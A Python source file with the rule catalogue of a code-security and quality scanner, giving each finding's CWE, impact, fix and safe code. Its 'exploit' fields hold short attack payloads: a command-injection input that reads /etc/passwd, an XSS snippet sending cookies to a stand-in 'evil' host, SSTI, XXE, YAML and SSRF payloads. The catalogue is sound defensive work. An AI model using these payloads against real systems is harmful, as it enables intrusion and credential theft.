"""Rule knowledge base: what each finding means, why it matters and how to fix it."""

SEVERITY_ORDER = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
SEVERITY_WEIGHT = {"critical": 10, "high": 6, "medium": 3, "low": 1, "info": 0.2}
CONF_WEIGHT = {"high": 1.0, "medium": 0.7, "low": 0.4}

# rule_id -> metadata. {placeholders} are filled with per-finding context by the agents.
RULES = {
    "SQLI": dict(
        title="SQL injection", category="security", cwe="CWE-89", owasp="A03:2021 Injection", severity="high",
        explanation="The query in `{func}` is assembled with string formatting/concatenation ({evidence}) "
                    "and passed to `{sink}`. Any value that reaches the query text is parsed as SQL, not as data.",
        impact="An attacker can read or modify arbitrary rows, bypass authentication (`' OR '1'='1`), "
               "or in some engines execute OS commands. Typical result: full database disclosure.",
        exploit="input:  x' OR '1'='1' --   ->   WHERE name = 'x' OR '1'='1' --'",
        fix="Use parameterised queries: keep the SQL text constant and pass values as a separate tuple.",
        safe="cursor.execute(\"SELECT * FROM users WHERE name = ?\", (name,))"),
    "CMDI": dict(
        title="OS command injection", category="security", cwe="CWE-78", owasp="A03:2021 Injection", severity="high",
        explanation="`{func}` builds a shell command from variable data ({evidence}) and runs it through `{sink}`. "
                    "The shell interprets `;`, `&&`, `|`, `$()` and backticks inside that data.",
        impact="Remote command execution with the privileges of the service account: data theft, "
               "persistence, lateral movement.",
        exploit="input:  8.8.8.8; cat /etc/passwd",
        fix="Pass an argument list to `subprocess.run([...], shell=False)` and validate the value against an allow-list.",
        safe="subprocess.run([\"ping\", \"-c\", \"1\", host], check=True, timeout=5)"),
    "CMD_SHELL": dict(
        title="Subprocess with shell=True", category="security", cwe="CWE-78", owasp="A03:2021 Injection",
        severity="medium",
        explanation="`{sink}` is called with `shell=True`. Even with a constant string this widens the attack surface "
                    "the moment any argument becomes dynamic.",
        impact="Latent command injection; hard to audit later.",
        exploit="n/a (latent)", fix="Drop `shell=True` and pass a list of arguments.",
        safe="subprocess.run([\"ls\", \"-l\"], check=True)"),
    "EVAL": dict(
        title="Dynamic code evaluation (eval/exec)", category="security", cwe="CWE-95",
        owasp="A03:2021 Injection", severity="high",
        explanation="`{sink}` evaluates a non-constant expression in `{func}` ({evidence}). Whatever text reaches it "
                    "runs as Python code inside your process.",
        impact="Arbitrary code execution: full compromise of the application and its secrets.",
        exploit="input:  __import__('os').system('id')",
        fix="Use `ast.literal_eval` for literals, a dispatch table for operations, or a real parser.",
        safe="value = ast.literal_eval(text)"),
    "DESER": dict(
        title="Unsafe deserialization", category="security", cwe="CWE-502",
        owasp="A08:2021 Software and Data Integrity Failures", severity="high",
        explanation="`{sink}` reconstructs Python objects from bytes/text in `{func}`. Pickle-style formats can "
                    "invoke arbitrary callables during loading.",
        impact="Remote code execution when the data is attacker-influenced (uploads, cookies, cache, queues).",
        exploit="crafted pickle with __reduce__ -> os.system(...)",
        fix="Use JSON (or another data-only format) and validate the schema; sign data if it must round-trip.",
        safe="data = json.loads(payload)"),
    "YAML_LOAD": dict(
        title="yaml.load without SafeLoader", category="security", cwe="CWE-502",
        owasp="A08:2021 Software and Data Integrity Failures", severity="high",
        explanation="`yaml.load` without a safe loader can construct arbitrary Python objects from a YAML document.",
        impact="Code execution through a crafted YAML file.", exploit="!!python/object/apply:os.system ['id']",
        fix="Use `yaml.safe_load`.", safe="config = yaml.safe_load(stream)"),
    "PATH": dict(
        title="Path traversal", category="security", cwe="CWE-22", owasp="A01:2021 Broken Access Control",
        severity="high",
        explanation="A user-controlled value reaches `{sink}` in `{func}` without being confined to a base directory "
                    "({evidence}).",
        impact="Read or overwrite files outside the intended folder (`../../etc/passwd`, app secrets, SSH keys).",
        exploit="filename=../../../../etc/passwd",
        fix="Resolve the final path and verify it stays inside the base directory; use `secure_filename` for uploads.",
        safe="p = (BASE / name).resolve()\nif BASE not in p.parents: abort(400)"),
    "XSS": dict(
        title="Cross-site scripting (XSS)", category="security", cwe="CWE-79", owasp="A03:2021 Injection",
        severity="high",
        explanation="`{func}` returns/renders HTML that embeds a user-controlled value ({evidence}) without output "
                    "encoding.",
        impact="Session theft, account takeover, phishing overlays and defacement in the victim's browser.",
        exploit="<script>fetch('//evil/?c='+document.cookie)</script>",
        fix="Escape on output (`markupsafe.escape` / template auto-escaping) and avoid `|safe`, `Markup()`, `mark_safe()`.",
        safe="return f\"<p>Hello {escape(name)}</p>\""),
    "SSTI": dict(
        title="Server-side template injection", category="security", cwe="CWE-1336",
        owasp="A03:2021 Injection", severity="high",
        explanation="`render_template_string` receives a dynamic template ({evidence}). Template expressions in the data are executed.",
        impact="Code execution on the server through template syntax such as `{{ config }}`.",
        exploit="{{ ''.__class__.__mro__[1].__subclasses__() }}",
        fix="Keep templates static files and pass user data as context variables.",
        safe="render_template('hello.html', name=name)"),
    "SSRF": dict(
        title="Server-side request forgery (SSRF)", category="security", cwe="CWE-918",
        owasp="A10:2021 Server-Side Request Forgery", severity="medium",
        explanation="`{sink}` requests a URL controlled by the caller ({evidence}).",
        impact="Access to internal services and cloud metadata endpoints (169.254.169.254) through your server.",
        exploit="url=http://169.254.169.254/latest/meta-data/",
        fix="Allow-list hosts/schemes, resolve and block private IP ranges, and set a timeout.",
        safe="if urlparse(url).hostname not in ALLOWED_HOSTS: abort(400)"),
    "TLS_VERIFY": dict(
        title="TLS certificate verification disabled", category="security", cwe="CWE-295",
        owasp="A02:2021 Cryptographic Failures", severity="medium",
        explanation="`{sink}` disables certificate validation, so any machine-in-the-middle can impersonate the server.",
        impact="Interception or modification of traffic, including credentials.", exploit="n/a",
        fix="Remove `verify=False`; add the private CA to the trust store if needed.", safe="requests.get(url, timeout=5)"),
    "WEAK_HASH": dict(
        title="Weak hash algorithm", category="security", cwe="CWE-327", owasp="A02:2021 Cryptographic Failures",
        severity="medium",
        explanation="`{sink}` uses a broken/fast hash. It is collision-prone and unsuitable for passwords or integrity.",
        impact="Password cracking in seconds; forged checksums/signatures.", exploit="rainbow tables / GPU cracking",
        fix="Use SHA-256+ for integrity and `bcrypt`/`argon2`/`hashlib.scrypt` for passwords.",
        safe="hashlib.sha256(data).hexdigest()"),
    "WEAK_RANDOM": dict(
        title="Predictable random for a secret", category="security", cwe="CWE-338",
        owasp="A02:2021 Cryptographic Failures", severity="medium",
        explanation="`{sink}` is not cryptographically secure but is used to produce `{evidence}`.",
        impact="Guessable tokens, OTPs and session IDs.", exploit="predict next value from observed outputs",
        fix="Use the `secrets` module.", safe="token = secrets.token_urlsafe(32)"),
    "HARDCODED_SECRET": dict(
        title="Hard-coded credential / secret", category="security", cwe="CWE-798",
        owasp="A07:2021 Identification and Authentication Failures", severity="high",
        explanation="A literal secret is assigned to `{evidence}`. It ships with the source code, history and forks.",
        impact="Anyone with repository access (or a leaked copy) can use the credential.",
        exploit="git log -p | grep -i password",
        fix="Load secrets from environment variables or a secret manager and rotate the leaked value now.",
        safe="API_KEY = os.environ[\"API_KEY\"]"),
    "DEBUG_ON": dict(
        title="Debug mode enabled", category="security", cwe="CWE-489", owasp="A05:2021 Security Misconfiguration",
        severity="medium",
        explanation="Debug is switched on (`{evidence}`). Flask/Django debuggers expose an interactive console and stack traces.",
        impact="Remote code execution through the Werkzeug console; information disclosure.", exploit="n/a",
        fix="Read the flag from configuration and default to off.", safe="app.run(debug=False)"),
    "INSECURE_TEMP": dict(
        title="Insecure temporary file", category="security", cwe="CWE-377", owasp="A01:2021 Broken Access Control",
        severity="low", explanation="`tempfile.mktemp` returns a name without creating the file - a race condition.",
        impact="Symlink/race attacks on temporary data.", exploit="n/a",
        fix="Use `tempfile.mkstemp` or `NamedTemporaryFile`.", safe="with tempfile.NamedTemporaryFile() as f: ..."),
    "PERMS": dict(
        title="Overly permissive file mode", category="security", cwe="CWE-732",
        owasp="A01:2021 Broken Access Control", severity="medium",
        explanation="`{sink}` sets world-writable permissions.", impact="Any local user can tamper with the file.",
        exploit="n/a", fix="Use 0o600/0o640 as appropriate.", safe="os.chmod(path, 0o600)"),
    "JWT_NOVERIFY": dict(
        title="JWT signature verification disabled", category="security", cwe="CWE-347",
        owasp="A02:2021 Cryptographic Failures", severity="critical",
        explanation="The token is decoded without verifying its signature.",
        impact="Anyone can forge tokens and impersonate any user or role.", exploit="alg=none token",
        fix="Always verify with a key and pin the allowed algorithms.",
        safe="jwt.decode(token, KEY, algorithms=[\"HS256\"])"),
    "XXE": dict(
        title="XML parser vulnerable to XXE", category="security", cwe="CWE-611",
        owasp="A05:2021 Security Misconfiguration", severity="medium",
        explanation="`{sink}` uses the standard XML parser on external input; entity expansion attacks are possible.",
        impact="File disclosure, SSRF, denial of service (billion laughs).", exploit="<!ENTITY x SYSTEM 'file:///etc/passwd'>",
        fix="Use `defusedxml`.", safe="from defusedxml import ElementTree as ET"),
    "OPEN_REDIRECT": dict(
        title="Open redirect", category="security", cwe="CWE-601", owasp="A01:2021 Broken Access Control",
        severity="medium", explanation="`{sink}` redirects to a caller-controlled URL ({evidence}).",
        impact="Phishing through a trusted domain.", exploit="?next=https://evil.example",
        fix="Only redirect to relative paths or allow-listed hosts.", safe="if not next.startswith('/'): next = '/'"),
    "CSRF_EXEMPT": dict(
        title="CSRF protection disabled", category="security", cwe="CWE-352",
        owasp="A01:2021 Broken Access Control", severity="medium",
        explanation="`@csrf_exempt` removes CSRF validation from `{func}`.",
        impact="Cross-site requests can trigger state changes with the victim's session.", exploit="n/a",
        fix="Remove the decorator and send the CSRF token, or use token-based auth.", safe="# remove @csrf_exempt"),
    "LOG_SECRET": dict(
        title="Sensitive value written to logs", category="security", cwe="CWE-532",
        owasp="A09:2021 Security Logging and Monitoring Failures", severity="medium",
        explanation="`{sink}` writes `{evidence}` to logs/stdout.", impact="Credentials end up in log aggregation systems.",
        exploit="n/a", fix="Never log secrets; mask or omit them.", safe="logger.info('login for user=%s', user)"),
    "TLS_INSECURE_CTX": dict(
        title="Unverified SSL context", category="security", cwe="CWE-295",
        owasp="A02:2021 Cryptographic Failures", severity="medium",
        explanation="An unverified SSL context is created.", impact="Traffic interception.", exploit="n/a",
        fix="Use `ssl.create_default_context()`.", safe="ctx = ssl.create_default_context()"),
    "JS_INNERHTML": dict(
        title="DOM XSS sink (innerHTML / document.write)", category="security", cwe="CWE-79",
        owasp="A03:2021 Injection", severity="high",
        explanation="Dynamic data is written into the DOM as HTML.", impact="Script execution in the victim's browser.",
        exploit="<img src=x onerror=alert(1)>", fix="Use `textContent` or a sanitizer such as DOMPurify.",
        safe="el.textContent = value"),
    "JS_EVAL": dict(
        title="eval / Function constructor", category="security", cwe="CWE-95", owasp="A03:2021 Injection",
        severity="high", explanation="Dynamic code evaluation of a non-literal.", impact="Script/code execution.",
        exploit="n/a", fix="Parse data with JSON.parse; avoid eval.", safe="const obj = JSON.parse(text)"),
    "JS_EXEC": dict(
        title="Node child_process with dynamic command", category="security", cwe="CWE-78",
        owasp="A03:2021 Injection", severity="high", explanation="A shell command is built from variable data.",
        impact="Remote command execution.", exploit="n/a", fix="Use `execFile` with an argument array.",
        safe="execFile('ls', ['-l', dir])"),
    "PHP_SQLI": dict(
        title="SQL built from request data (PHP)", category="security", cwe="CWE-89", owasp="A03:2021 Injection",
        severity="high", explanation="Query concatenates `$_GET/$_POST` values.", impact="Database compromise.",
        exploit="' OR 1=1 --", fix="Use PDO prepared statements.", safe="$stmt = $pdo->prepare('... WHERE id = ?');"),
    "PHP_INCLUDE": dict(
        title="File inclusion from request data (PHP)", category="security", cwe="CWE-98",
        owasp="A03:2021 Injection", severity="high", explanation="include/require uses user input.",
        impact="Remote/local file inclusion -> code execution.", exploit="?page=../../etc/passwd",
        fix="Map allowed page names to files.", safe="$pages = ['home'=>'home.php'];"),
    "JAVA_SQLI": dict(
        title="SQL built with string concatenation (Java)", category="security", cwe="CWE-89",
        owasp="A03:2021 Injection", severity="high", explanation="Statement text is concatenated.",
        impact="Database compromise.", exploit="' OR '1'='1", fix="Use PreparedStatement with `?`.",
        safe="ps = conn.prepareStatement(\"... WHERE id = ?\");"),
    "GENERIC_SECRET": dict(
        title="Secret-like token committed", category="security", cwe="CWE-798",
        owasp="A07:2021 Identification and Authentication Failures", severity="critical",
        explanation="A string matching a well-known credential format was found ({evidence}).",
        impact="Live credential exposure; treat as compromised.", exploit="n/a",
        fix="Revoke/rotate immediately, then remove from history.", safe="use a secret manager"),
    # ------------------------------------------------------------- quality
    "Q_COMPLEXITY": dict(
        title="High cyclomatic complexity", category="quality", cwe="", owasp="", severity="medium",
        explanation="`{func}` has cyclomatic complexity {evidence}. The base-paper study ranks this among the top "
                    "predictors of vulnerable functions (metric M1).",
        impact="Harder to test and review; higher chance of hidden security defects.", exploit="",
        fix="Split into smaller functions, use early returns and lookup tables.", safe=""),
    "Q_NESTING": dict(
        title="Deeply nested control flow", category="quality", cwe="", owasp="", severity="medium",
        explanation="`{func}` nests control structures {evidence} levels deep (paper metric M9).",
        impact="Correlated with vulnerability likelihood and review fatigue.", exploit="",
        fix="Invert conditions, extract helpers, use guard clauses.", safe=""),
    "Q_LONG_FUNC": dict(
        title="Very long function", category="quality", cwe="", owasp="", severity="low",
        explanation="`{func}` is {evidence} lines long.", impact="Low cohesion; difficult to review.", exploit="",
        fix="Extract cohesive blocks into named helpers.", safe=""),
    "Q_MANY_PARAMS": dict(
        title="Too many parameters", category="quality", cwe="", owasp="", severity="low",
        explanation="`{func}` takes {evidence} parameters (paper metric M5: more caller arguments -> more risk).",
        impact="Easy to pass arguments in the wrong order; larger unvalidated input surface.", exploit="",
        fix="Group related values into a dataclass and validate inputs at the boundary.", safe=""),
    "Q_MUTABLE_DEFAULT": dict(
        title="Mutable default argument", category="quality", cwe="CWE-1188", owasp="", severity="medium",
        explanation="A default of `{evidence}` is shared across calls.", impact="State leaks between calls.", exploit="",
        fix="Default to `None` and create the object inside.", safe="def f(items=None):\n    items = items or []"),
    "Q_BARE_EXCEPT": dict(
        title="Bare / silent exception handler", category="quality", cwe="CWE-703", owasp="", severity="low",
        explanation="An `except` block in `{func}` swallows errors ({evidence}).",
        impact="Failures (including security checks) are silently ignored.", exploit="",
        fix="Catch specific exceptions and log or re-raise.", safe="except ValueError as exc:\n    logger.warning(...)"),
    "Q_NO_DOCSTRING": dict(
        title="Missing docstring", category="quality", cwe="", owasp="", severity="info",
        explanation="`{func}` has no docstring.", impact="Slower onboarding.", exploit="",
        fix="Add a one-line summary of purpose and inputs.", safe=""),
    "Q_UNUSED_IMPORT": dict(
        title="Unused import", category="quality", cwe="", owasp="", severity="info",
        explanation="`{evidence}` is imported but never used.", impact="Noise, slower start-up.", exploit="",
        fix="Remove the import.", safe=""),
    "Q_PRINT": dict(
        title="Debug print statement", category="quality", cwe="", owasp="", severity="info",
        explanation="`print` used in `{func}`.", impact="Leaks data to stdout; not structured.", exploit="",
        fix="Use the logging module.", safe="logger.debug(...)"),
    "Q_TODO": dict(
        title="TODO / FIXME left in change", category="quality", cwe="", owasp="", severity="info",
        explanation="Marker `{evidence}` found.", impact="Unfinished work merged.", exploit="",
        fix="Resolve or track in an issue.", safe=""),
    "Q_NONE_CMP": dict(
        title="Comparison to None with ==", category="quality", cwe="", owasp="", severity="info",
        explanation="Use identity comparison for None.", impact="Surprising behaviour with custom __eq__.", exploit="",
        fix="Use `is None` / `is not None`.", safe="if x is None:"),
    "Q_STAR_IMPORT": dict(
        title="Wildcard import", category="quality", cwe="", owasp="", severity="low",
        explanation="`from {evidence} import *` pollutes the namespace.", impact="Name clashes; unclear origins.",
        exploit="", fix="Import explicit names.", safe=""),
    "Q_ML_RISK": dict(
        title="ML-predicted high-risk function", category="security", cwe="", owasp="", severity="medium",
        explanation="The metric model (base-paper technique) scores `{func}` at {evidence} probability of being vulnerable.",
        impact="Structural signals (complexity, nesting, risky calls) resemble known vulnerable functions.", exploit="",
        fix="Review this function manually; reduce complexity and validate inputs.", safe=""),
}


def rule(rule_id: str) -> dict:
    return RULES.get(rule_id, dict(title=rule_id, category="quality", cwe="", owasp="", severity="info",
                                   explanation="", impact="", exploit="", fix="", safe=""))
